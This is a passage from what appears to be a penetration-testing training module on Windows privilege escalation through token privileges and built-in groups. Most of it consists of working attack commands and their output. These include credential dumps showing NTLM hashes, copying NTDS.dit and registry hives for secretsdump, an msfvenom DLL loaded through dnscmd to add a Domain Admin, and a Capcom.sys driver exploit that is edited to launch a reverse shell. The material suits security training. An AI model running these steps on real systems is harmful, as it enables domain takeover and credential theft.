; 23026942 (00000000:015f5cfe) Session : RemoteInteractive from 2 User Name : jordan Domain : WINLPE-SRV01 Logon Server : WINLPE-SRV01 Logon Time : 3/31/2021 2:59:52 PM SID : S-1-5-21-3769161915-3336846931-3985975925-1000 msv : [00000003] Primary * Username : jordan * Domain : WINLPE-SRV01 * NTLM : cf3a5525ee9414229e66279623ed5c58 * SHA1 : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2 tspkg : wdigest : * Username : jordan * Domain : WINLPE-SRV01 * Password : (null) kerberos : * Username : jordan * Domain : WINLPE-SRV01 * Password : (null) ssp : credman : \u003cSNIP\u003e Remote Code Execution as SYSTEM We can also leverage SeDebugPrivilege for RCE. Using this technique, we can elevate our privileges to SYSTEM by launching a child process and using the elevated rights granted to our account via SeDebugPrivilege to alter normal system behavior to inherit the token of a parent process and impersonate it. If we target a parent process running as SYSTEM (specifying the Process ID (or PID) of the target process or running program), then we can elevate our rights quickly. Let‚Äôs see this in action.\nFirst, transfer this PoC script over to the target system. Next we just load the script and run it with the following syntax [MyProcess]::CreateProcessFromParent(\u003csystem_pid\u003e,\u003ccommand_to_execute\u003e,\"\"). Note that we must add a third blank argument \"\" at the end for the PoC to work properly.\nThe PoC script has received an update. Please visit its GitHub repository and review its usage. https://github.com/decoder-it/psgetsystem\nFirst, open an elevated PowerShell console (right-click, run as admin, and type in the credentials for the jordan user). Next, type tasklist to get a listing of running processes and accompanying PIDs.\nSeDebugPrivilege\nPS C:\\local\u003e tasklist Image Name PID Session Name Session# Mem Usage ========================= ======== ================ =========== ============ System Idle Process 0 Services 0 4 K System 4 Services 0 116 K smss.exe 340 Services 0 1,212 K csrss.exe 444 Services 0 4,696 K wininit.exe 548 Services 0 5,240 K csrss.exe 556 Console 1 5,972 K winlogon.exe 612 Console 1 10,408 K Here we can target winlogon.exe running under PID 612, which we know runs as SYSTEM on Windows hosts.\nWe could also use the Get-Process cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script, cutting down on the number of steps required.\nOther tools such as this one exist to pop a SYSTEM shell when we have SeDebugPrivilege. Often we will not have RDP access to a host, so we‚Äôll have to modify our PoCs to either return a reverse shell to our attack host as SYSTEM or another command, such as adding an admin user. Play around with these PoCs and see what other ways you can achieve SYSTEM access, especially if you do not have a fully interactive session, such as when you achieve command injection or have a web shell or reverse shell connection as the user with SeDebugPrivilege. Keep these examples in mind in case you ever run into a situation where dumping LSASS does not result in any useful credentials (though we can get SYSTEM access with just the machine NTLM hash, but that‚Äôs outside the scope of this module) and a shell or RCE as SYSTEM would be beneficial.\nLeveraging the Privilege Reviewing Current User Privileges Let‚Äôs review our current user‚Äôs privileges.\nSeTakeOwnershipPrivilege\nPS C:\\local\u003e whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ======================================================= ======== SeTakeOwnershipPrivilege Take ownership of files or other objects Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled Enabling SeTakeOwnershipPrivilege Notice from the output that the privilege is not enabled. We can enable it using this script which is detailed in this blog post, as well as this one which builds on the initial concept.\nSeTakeOwnershipPrivilege\nPS C:\\local\u003e Import-Module .\\Enable-Privilege.ps1 PS C:\\local\u003e .\\EnableAllTokenPrivs.ps1 PS C:\\local\u003e whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ======================================== ======= SeTakeOwnershipPrivilege Take ownership of files or other objects Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled PS C:\\local\u003e takeown /f 'C:\\Department Shares\\Private\\IT\\cred.txt' SUCCESS: The file (or folder): \"C:\\Department Shares\\Private\\IT\\cred.txt\" now owned by user \"WINLPE-SRV01\\local-student\". Let‚Äôs grant our user full privileges over the target file.\nSeTakeOwnershipPrivilege\nPS C:\\local\u003e icacls 'C:\\Department Shares\\Private\\IT\\cred.txt' /grant local-student:F processed file: C:\\Department Shares\\Private\\IT\\cred.txt Successfully processed 1 files; Failed processing 0 files When to Use? Files of Interest Some local files of interest may include:\nSeTakeOwnershipPrivilege\nc:\\inetpub\\wwwwroot\\web.config %WINDIR%\\repair\\sam %WINDIR%\\repair\\system %WINDIR%\\repair\\software, %WINDIR%\\repair\\security %WINDIR%\\system32\\config\\SecEvent.Evt %WINDIR%\\system32\\config\\default.sav %WINDIR%\\system32\\config\\security.sav %WINDIR%\\system32\\config\\software.sav %WINDIR%\\system32\\config\\system.sav Windows Built-in Groups Backup Operators Event Log Readers DnsAdmins Hyper-V Administrators Print Operators Server Operators Verifying SeBackupPrivilege is Enabled Let‚Äôs check if SeBackupPrivilege is enabled by invoking whoami /priv or Get-SeBackupPrivilege cmdlet. If the privilege is disabled, we can enable it with Set-SeBackupPrivilege.\nNote: Based on the server‚Äôs settings, it might be required to spawn an elevated CMD prompt to bypass UAC and have this privilege.\nPS C:\\local\u003e whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======== SeMachineAccountPrivilege Add workstations to domain Disabled SeBackupPrivilege Back up files and directories Disabled SeRestorePrivilege Restore files and directories Disabled SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled Importing Libraries PS C:\\local\u003e Import-Module .\\SeBackupPrivilegeUtils.dll PS C:\\local\u003e Import-Module .\\SeBackupPrivilegeCmdLets.dll Copying a Protected File PS C:\\local\u003e Copy-FileSeBackupPrivilege 'C:\\Confidential\\2021 Contract.txt' .\\Contract.txt Copied 88 bytes PS C:\\local\u003e cat .\\Contract.txt Inlanefreight 2021 Contract ============================== Board of Directors: Copying NTDS.dit Locally PS C:\\local\u003e diskshadow.exe Microsoft DiskShadow version 1.0 Copyright (C) 2013 Microsoft Corporation On computer: DC, 10/14/2020 12:57:52 AM DISKSHADOW\u003e set verbose on DISKSHADOW\u003e set metadata C:\\Windows\\Temp\\meta.cab DISKSHADOW\u003e set context clientaccessible DISKSHADOW\u003e set context persistent DISKSHADOW\u003e begin backup DISKSHADOW\u003e add volume C: alias cdrive DISKSHADOW\u003e create DISKSHADOW\u003e expose %cdrive% E: DISKSHADOW\u003e end backup DISKSHADOW\u003e exit PS C:\\local\u003e dir E: Directory: E:\\ Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 5/6/2021 1:00 PM Confidential d----- 9/15/2018 12:19 AM PerfLogs d-r--- 3/24/2021 6:20 PM Program Files d----- 9/15/2018 2:06 AM Program Files (x86) d----- 5/6/2021 1:05 PM Tools d-r--- 5/6/2021 12:51 PM Users d----- 3/24/2021 6:38 PM Windows Copying NTDS.dit Locally Next, we can use the Copy-FileSeBackupPrivilege cmdlet to bypass the ACL and copy the NTDS.dit locally.\nPS C:\\local\u003e Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Tools\\ntds.dit Copied 16777216 bytes Backing up SAM and SYSTEM Registry Hives The privilege also lets us back up the SAM and SYSTEM registry hives, which we can extract local account credentials offline using a tool such as Impacket‚Äôs secretsdump.py\nC:\\local\u003e reg save HKLM\\SYSTEM SYSTEM.SAV The operation completed successfully. C:\\local\u003e reg save HKLM\\SAM SAM.SAV The operation completed successfully Extracting Credentials from NTDS.dit With the NTDS.dit extracted, we can use a tool such as secretsdump.py or the PowerShell DSInternals module to extract all Active Directory account credentials. Let‚Äôs obtain the NTLM hash for just the administrator account for the domain using DSInternals.\nPS C:\\local\u003e Import-Module .\\DSInternals.psd1 PS C:\\local\u003e $key = Get-BootKey -SystemHivePath .\\SYSTEM PS C:\\local\u003e Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\\ntds.dit -BootKey $key DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL Sid: S-1-5-21-669053619-2741956077-1013132368-500 Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215 SamAccountName: Administrator SamAccountType: User UserPrincipalName: PrimaryGroupId: 513 SidHistory: Enabled: True UserAccountControl: NormalAccount, PasswordNeverExpires AdminCount: True Deleted: False LastLogonDate: 5/6/2021 5:40:30 PM DisplayName: GivenName: Surname: Description: Built-in account for administering the computer/domain ServicePrincipalName: SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative Owner: S-1-5-21-669053619-2741956077-1013132368-512 Secrets NTHash: cf3a5525ee9414229e66279623ed5c58 LMHash: NTHashHistory: LMHashHistory: SupplementalCredentials: ClearText: NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7 Kerberos: Credentials: DES_CBC_MD5 Key: d60dfbbf20548938 OldCredentials: Salt: WIN-NB4NGP3TKNKAdministrator Flags: 0 KerberosNew: Credentials: AES256_CTS_HMAC_SHA1_96 Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43 Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: 94c300d0e47775b407f2496a5cca1a0a Iterations: 4096 DES_CBC_MD5 Key: d60dfbbf20548938 Iterations: 4096 OldCredentials: OlderCredentials: ServiceCredentials: Salt: WIN-NB4NGP3TKNKAdministrator DefaultIterationCount: 4096 Flags: 0 WDigest: Key Credentials: Credential Roaming Created: Modified: Credentials: Extracting Hashes Using SecretsDump We can also use SecretsDump offline to extract hashes from the ntds.dit file obtained earlier. These can then be used for pass-the-hash to access additional resources or cracked offline using Hashcat to gain further access. If cracked, we can also present the client with password cracking statistics to provide them with detailed insight into overall password strength and usage within their domain and provide recommendations for improving their password policy (increasing minimum length, creating a dictionary of disallowed words, etc.).\n[!bash!]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation [*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330 [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129::: local-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5::: svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58::: \u003cSNIP\u003e Robocopy Copying Files with Robocopy The built-in utility robocopy can be used to copy files in backup mode as well. Robocopy is a command-line directory replication tool. It can be used to create backup jobs and includes features such as multi-threaded copying, automatic retry, the ability to resume copying, and more. Robocopy differs from the copy command in that instead of just copying all files, it can check the destination directory and remove files no longer in the source directory. It can also compare files before copying to save time by not copying files that have not been changed since the last copy/backup job ran.\nC:\\local\u003e robocopy /B E:\\Windows\\NTDS .\\ntds ntds.dit ------------------------------------------------------------------------------- ROBOCOPY :: Robust File Copy for Windows ------------------------------------------------------------------------------- Started : Thursday, May 6, 2021 1:11:47 PM Source : E:\\Windows\\NTDS\\ Dest : C:\\Tools\\ntds\\ Files : ntds.dit Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30 ------------------------------------------------------------------------------ New Dir 1 E:\\Windows\\NTDS\\ 100% New File 16.0 m ntds.dit ------------------------------------------------------------------------------ Total Copied Skipped Mismatch FAILED Extras Dirs : 1 1 0 0 0 0 Files : 1 1 0 0 0 0 Bytes : 16.00 m 16.00 m 0 0 0 0 Times : 0:00:00 0:00:00 0:00:00 0:00:00 Speed : 356962042 Bytes/sec. Speed : 20425.531 MegaBytes/min. Ended : Thursday, May 6, 2021 1:11:47 PM This eliminates the need for any external tools.\nEvent Log Readers Confirming Group Membership Event Log Readers\nC:\\local\u003e net localgroup \"Event Log Readers\" Alias name Event Log Readers Comment Members of this group can read event logs from local machine Members ------------------------------------------------------------------------------- logger The command completed successfully Searching Security Logs Using wevtutil Event Log Readers\nPS C:\\local\u003e wevtutil qe Security /rd:true /f:text | Select-String \"/user\" Process Command Line: net use T: \\\\fs01\\backups /user:tim MyStr0ngP@ssword Passing Credentials to wevtutil Event Log Readers\nC:\\local\u003e wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr \"/user\" Searching Security Logs Using Get-WinEvent Event Log Readers\nPS C:\\local\u003e Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }} CommandLine ----------- net use T: \\\\fs01\\backups /user:tim MyStr0ngP@ssword DnsAdmins cube111@local[/local]$ msfvenom -p windows/x64/exec cmd='net group \"domain admins\" netadm /add /domain' -f dll -o adduser.dll [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 313 bytes Final size of dll file: 5120 bytes Saved as: adduser.dll Loading DLL as Non-Privileged User DnsAdmins\nC:\\local\u003e dnscmd.exe /config /serverlevelplugindll C:\\Users\\netadm\\Desktop\\adduser.dll DNS Server failed to reset registry property. Status = 5 (0x00000005) Command failed: ERROR_ACCESS_DENIED As expected, attempting to execute this command as a normal user isn‚Äôt successful. Only members of the DnsAdmins group are permitted to do this.\nLoading DLL as Member of DnsAdmins DnsAdmins\nC:\\local\u003e Get-ADGroupMember -Identity DnsAdmins distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL name : netadm objectClass : user objectGUID : 1a1ac159-f364-4805-a4bb-7153051a8c14 SamAccountName : netadm SID : S-1-5-21-669053619-2741956077-1013132368-1109 Loading Custom DLL After confirming group membership in the DnsAdmins group, we can re-run the command to load a custom DLL.\nDnsAdmins\nC:\\local\u003e dnscmd.exe /config /serverlevelplugindll C:\\Users\\netadm\\Desktop\\adduser.dll Registry property serverlevelplugindll successfully reset. Command completed successfully. Note: We must specify the full path to our custom DLL or the attack will not work properly.\nOnly the dnscmd utility can be used by members of the DnsAdmins group, as they do not directly have permission on the registry key.\nWith the registry setting containing the path of our malicious plugin configured, and our payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn‚Äôt give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.\nAfter restarting the DNS service (if our user has this level of access), we should be able to run our custom DLL and add a user (in our case) or get a reverse shell. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let‚Äôs check our current user‚Äôs permissions on the DNS service.\nFinding User‚Äôs SID First, we need our user‚Äôs SID.\nDnsAdmins\nC:\\local\u003e wmic useraccount where name=\"netadm\" get sid SID S-1-5-21-669053619-2741956077-1013132368-1109 Checking Permissions on DNS Service Once we have the user‚Äôs SID, we can use the sc command to check permissions on the service. Per this article, we can see that our user has RPWP permissions which translate to SERVICE_START and SERVICE_STOP, respectively.\nDnsAdmins\nC:\\local\u003e sc.exe sdshow DNS D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD) Check out the Windows Fundamentals module for an explanation of SDDL syntax in Windows.\nStopping the DNS Service After confirming these permissions, we can issue the following commands to stop and start the service.\nDnsAdmins\nC:\\local\u003e sc stop dns SERVICE_NAME: dns TYPE : 10 WIN32_OWN_PROCESS STATE : 3 STOP_PENDING (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x1 WAIT_HINT : 0x7530 The DNS service will attempt to start and run our custom DLL, but if we check the status, it will show that it failed to start correctly (more on this later).\nStarting the DNS Service DnsAdmins\nC:\\local\u003e sc start dns SERVICE_NAME: dns TYPE : 10 WIN32_OWN_PROCESS STATE : 2 START_PENDING (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x7d0 PID : 6960 FLAGS : Confirming Group Membership If all goes to plan, our account will be added to the Domain Admins group or receive a reverse shell if our custom DLL was made to give us a connection back.\nDnsAdmins\nC:\\local\u003e net group \"Domain Admins\" /dom Group name Domain Admins Comment Designated administrators of the domain Members ------------------------------------------------------------------------------- Administrator netadm The command completed successfully. Cleaning Up Making configuration changes and stopping/restarting the DNS service on a Domain Controller are very destructive actions and must be exercised with great care. As a penetration tester, we need to run this type of action by our client before proceeding with it since it could potentially take down DNS for an entire Active Directory environment and cause many issues. If our client gives their permission to go ahead with this attack, we need to be able to either cover our tracks and clean up after ourselves or offer our client steps on how to revert the changes.\nThese steps must be taken from an elevated console with a local or domain admin account.\nConfirming Registry Key Added The first step is confirming that the ServerLevelPluginDll registry key exists. Until our custom DLL is removed, we will not be able to start the DNS service again correctly.\nDnsAdmins\nC:\\local\u003e reg query \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters GlobalQueryBlockList REG_MULTI_SZ wpad\\0isatap EnableGlobalQueryBlockList REG_DWORD 0x1 PreviousLocalHostname REG_SZ WINLPE-DC01.INLANEFREIGHT.LOCAL Forwarders REG_MULTI_SZ 1.1.1.1\\08.8.8.8 ForwardingTimeout REG_DWORD 0x3 IsSlave REG_DWORD 0x0 BootMethod REG_DWORD 0x3 AdminConfigured REG_DWORD 0x1 ServerLevelPluginDll REG_SZ adduser.dll Deleting Registry Key We can use the reg delete command to remove the key that points to our custom DLL.\nDnsAdmins\nC:\\local\u003e reg delete \\\\10.129.43.9\\HKLM\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters /v ServerLevelPluginDll Delete the registry value ServerLevelPluginDll (Yes/No)? Y The operation completed successfully. Starting the DNS Service Again Once this is done, we can start up the DNS service again.\nDnsAdmins\nC:\\local\u003e sc.exe start dns SERVICE_NAME: dns TYPE : 10 WIN32_OWN_PROCESS STATE : 2 START_PENDING (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x7d0 PID : 4984 FLAGS : Checking DNS Service Status If everything went to plan, querying the DNS service will show that it is running. We can also confirm that DNS is working correctly within the environment by performing an nslookup against the localhost or another host in the domain.\nDnsAdmins\nC:\\local\u003e sc query dns SERVICE_NAME: dns TYPE : 10 WIN32_OWN_PROCESS STATE : 4 RUNNING (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 Hyper-V Administrators The Hyper-V Administrators group has full access to all Hyper-V features. If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.\nIt is also well documented on this blog, that upon deleting a virtual machine, vmms.exe attempts to restore the original file permissions on the corresponding .vhdx file and does so as NT AUTHORITY\\SYSTEM, without impersonating the user. We can delete the .vhdx file and create a native hard link to point this file to a protected SYSTEM file, which we will have full permissions to.\nIf the operating system is vulnerable to CVE-2018-0952 or CVE-2019-0841, we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.\nTarget File An example of this is Firefox, which installs the Mozilla Maintenance Service. We can update this exploit (a proof-of-concept for NT hard link) to grant our current user full permissions on the file below:\nHyper-V Administrators\nC:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe Taking Ownership of the File After running the PowerShell script, we should have full control of this file and can take ownership of it.\nHyper-V Administrators\nC:\\local\u003e takeown /F C:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe Starting the Mozilla Maintenance Service Next, we can replace this file with a malicious maintenanceservice.exe, start the maintenance service, and get command execution as SYSTEM.\nHyper-V Administrators\nC:\\local\u003e sc.exe start MozillaMaintenance Note: This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.\nPrevious\nPrint Operators Print Operators is another highly privileged group, which grants its members the SeLoadDriverPrivilege, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down. If we issue the command whoami /priv, and don‚Äôt see the SeLoadDriverPrivilege from an unelevated context, we will need to bypass UAC.\nConfirming Privileges Print Operators\nC:\\local\u003e whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ======================== ================================= ======= SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeShutdownPrivilege Shut down the system Disabled Checking Privileges Again The UACMe repo features a comprehensive list of UAC bypasses, which can be used from the command line. Alternatively, from a GUI, we can open an administrative command shell and input the credentials of the account that is a member of the Print Operators group. If we examine the privileges again, SeLoadDriverPrivilege is visible but disabled.\nPrint Operators\nC:\\local\u003e whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ================================== ========== SeMachineAccountPrivilege Add workstations to domain Disabled SeLoadDriverPrivilege Load and unload device drivers Disabled SeShutdownPrivilege Shut down the system\tDisabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled It‚Äôs well known that the driver Capcom.sys contains functionality to allow any user to execute shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver and escalate privileges. We can use this tool to load the driver. The PoC enables the privilege as well as loads the driver for us.\nDownload it locally and edit it, pasting over the includes below.\nCode: c\n#include \u003cwindows.h\u003e #include \u003cassert.h\u003e #include \u003cwinternl.h\u003e #include \u003csddl.h\u003e #include \u003cstdio.h\u003e #include \"tchar.h\" Next, from a Visual Studio 2019 Developer Command Prompt, compile it using cl.exe.\nCompile with cl.exe Print Operators\nC:\\Users\\mrb3n\\Desktop\\Print Operators\u003ecl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86 Copyright (C) Microsoft Corporation. All rights reserved. EnableSeLoadDriverPrivilege.cpp Microsoft (R) Incremental Linker Version 14.28.29913.0 Copyright (C) Microsoft Corporation. All rights reserved. /out:EnableSeLoadDriverPrivilege.exe EnableSeLoadDriverPrivilege.obj Add Reference to Driver Next, download the Capcom.sys driver from here, and save it to C:\\temp. Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.\nPrint Operators\nC:\\local\u003e reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"\\??\\C:\\Tools\\Capcom.sys\" The operation completed successfully. C:\\local\u003e reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1 The operation completed successfully. The odd syntax \\??\\ used to reference our malicious driver‚Äôs ImagePath is an NT Object Path. The Win32 API will parse and resolve this path to properly locate and load our malicious driver.\nVerify Driver is not Loaded Using Nirsoft‚Äôs DriverView.exe, we can verify that the Capcom.sys driver is not loaded.\nPrint Operators\nPS C:\\local\u003e .\\DriverView.exe /stext drivers.txt PS C:\\local\u003e cat drivers.txt | Select-String -pattern Capcom Verify Privilege is Enabled Run the EnableSeLoadDriverPrivilege.exe binary.\nPrint Operators\nC:\\local\u003e EnableSeLoadDriverPrivilege.exe whoami: INLANEFREIGHT0\\printsvc whoami /priv SeMachineAccountPrivilege Disabled SeLoadDriverPrivilege Enabled SeShutdownPrivilege Disabled SeChangeNotifyPrivilege Enabled by default SeIncreaseWorkingSetPrivilege Disabled NTSTATUS: 00000000, WinError: 0 Verify Capcom Driver is Listed Next, verify that the Capcom driver is now listed.\nPrint Operators\nPS C:\\local\u003e .\\DriverView.exe /stext drivers.txt PS C:\\local\u003e cat drivers.txt | Select-String -pattern Capcom Driver Name : Capcom.sys Filename : C:\\Tools\\Capcom.sys Use ExploitCapcom Tool to Escalate Privileges To exploit the Capcom.sys, we can use the ExploitCapcom tool after compiling with it Visual Studio.\nPrint Operators\nPS C:\\local\u003e .\\ExploitCapcom.exe [*] Capcom.sys exploit [*] Capcom.sys handle was obained as 0000000000000070 [*] Shellcode was placed at 0000024822A50008 [+] Shellcode was executed [+] Token stealing was successful [+] The SYSTEM shell was launched This launches a shell with SYSTEM privileges.\nAlternate Exploitation - No GUI If we do not have GUI access to the target, we will have to modify the ExploitCapcom.cpp code before compiling. Here we can edit line 292 and replace \"C:\\\\Windows\\\\system32\\\\cmd.exe\" with, say, a reverse shell binary created with msfvenom, for example: c:\\ProgramData\\revshell.exe.\nCode: c\n// Launches a command shell process static bool LaunchShell() { TCHAR CommandLine[] = TEXT(\"C:\\\\Windows\\\\system32\\\\cmd.exe\"); PROCESS_INFORMATION ProcessInfo; STARTUPINFO StartupInfo = { sizeof(StartupInfo) }; if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, \u0026StartupInfo, \u0026ProcessInfo)) { return false; } CloseHandle(ProcessInfo.hThread); CloseHandle(ProcessInfo.hProcess); return true; } The CommandLine string in this example would be changed to:\nCode: c\nTCHAR CommandLine[] = TEXT(\"C:\\\\ProgramData\\\\revshell.exe\"); We would set up a listener based on the msfvenom payload we generated and hopefully receive a reverse shell connection back when executing ExploitCapcom.exe. If a reverse shell connection is blocked for some reason, we can try a bind shell or exec/add user payload.\nAutomating the Steps Automating with EopLoadDriver We can use a tool such as EoPLoadDriver to automate the process of enabling the privilege, creating the registry key, and executing NTLoadDriver to load the driver. To do this, we would run the following:\nPrint Operators\nC:\\local\u003e EoPLoadDriver.exe System\\CurrentControlSet\\Capcom c:\\Tools\\Capcom.sys [+] Enabling SeLoadDriverPrivilege [+] SeLoadDriverPrivilege Enabled [+] Loading Driver: \\Registry\\User\\S-1-5-21-454284637-3659702366-2958135535-1103\\System\\CurrentControlSet\\Capcom NTSTATUS: c000010e, WinError: 0 We would then run ExploitCapcom.exe to pop a SYSTEM shell or run our custom binary.\nClean-up Removing Registry Key We can cover our tracks a bit by deleting the registry key added earlier.\nPrint Operators\nC:\\local\u003e reg delete HKCU\\System\\CurrentControlSet\\Capcom Permanently delete the registry key HKEY_CURRENT_USER\\System\\CurrentControlSet\\Capcom (Yes/No)? Yes The operation completed successfully. Note: Since Windows 10 Version 1803, the ‚ÄúSeLoadDriverPrivil\nServer Operators The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.\nMembership of this group confers the powerful SeBackupPrivilege and SeRestorePrivilege privileges and the ability to control local services.\nQuerying the AppReadiness Service Let‚Äôs examine the AppReadiness service. We can confirm that this service starts as SYSTEM using the sc.exe utility.\nServer Operators\nC:\\local\u003e sc qc AppReadiness [SC] QueryServiceConfig SUCCESS SERVICE_NAME: AppReadiness TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Windows\\System32\\svchost.exe -k AppReadiness -p LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : App Readiness DEPENDENCIES : SERVICE_START_NAME : LocalSystem Checking Service Permissions with PsService We can use the service viewer/controller PsService, which is part of the Sysinternals suite, to check permissions on the service. PsService works much like the sc utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.\nServer Operators\nC:\\local\u003e c:\\Tools\\PsService.exe security AppReadiness PsService v2.25 - Service information and configuration utility Copyright (C) 2001-2010 Mark Russinovich Sysinternals - www.sysinternals.com SERVICE_NAME: AppReadiness DISPLAY_NAME: App Readiness ACCOUNT: LocalSystem SECURITY: [ALLOW] NT AUTHORITY\\SYSTEM Query status Query Config Interrogate Enumerate Dependents Pause/Resume Start Stop User-Defined Control Read Permissions [ALLOW] BUILTIN\\Administrators All [ALLOW] NT AUTHORITY\\INTERACTIVE Query status Query Config Interrogate Enumerate Dependents User-Defined Control Read Permissions [ALLOW] NT AUTHORITY\\SERVICE Query status Query Config Interrogate Enumerate Dependents User-Defined Control Read Permissions [ALLOW] BUILTIN\\Server Operators All This confirms that the Server Operators group has SERVICE_ALL_ACCESS access right, which gives us full control over this service.\nChecking Local Admin Group Membership Let‚Äôs take a look at the current members of the local administrators group and confirm that our target account is not present.\nServer Operators\nC:\\local\u003e net localgroup Administrators Alias name Administrators Comment Administrators have complete and unrestricted access to the computer/domain Members ------------------------------------------------------------------------------- Administrator Domain Admins Enterprise Admins The command completed successfully. Modifying the Service 